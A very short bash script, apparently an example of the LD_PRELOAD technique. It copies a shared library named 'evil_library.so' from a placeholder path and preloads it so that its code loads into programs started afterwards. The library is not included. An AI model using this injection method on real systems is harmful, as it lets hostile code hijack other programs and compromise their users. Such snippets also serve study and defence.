#!/bin/bash
cp /path/to/evil_library.so .
export LD_PRELOAD=./evil_library.so
